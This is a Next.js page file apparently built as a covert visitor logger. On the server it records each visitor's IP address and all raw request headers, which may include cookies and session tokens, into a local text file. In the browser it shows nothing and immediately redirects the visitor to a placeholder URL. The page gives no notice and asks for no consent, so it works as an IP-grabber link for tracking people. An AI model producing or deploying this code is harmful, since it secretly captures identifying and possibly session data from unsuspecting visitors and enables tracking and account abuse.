export async function getServerSideProps(context: any) {
  const res = context.req.rawHeaders
  let ip;
  const { req } = context;
  
  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(',')[0]
  } else if (req.headers["x-real-ip"]) {
    ip = req.connection.remoteAddress
  } else {
    ip = req.connection.remoteAddress
  }

  return { props: {res, ip} }
}

export default function Gmud5 (props: any) {
  
  const getData = async()=>{

    const dial = new Date();

    const ip = props.ip
    const user = props.res
    
    const Arp = '\n////////////'
    const Datelog = `\n${dial}\n`
    const IP = `IP: ${ip}\n`
    const User = `UserData: ${user}\n`

    const all = Arp + Datelog + IP + User;

  if(typeof window === 'undefined') {
    const fs = require('fs');
    const stateFile = "StateFile.txt";
    fs.appendFileSync(stateFile, all);
  }
  if (typeof window !== "undefined") {
    window.location.replace('https://');
  }
}

  getData();

  return null;
}

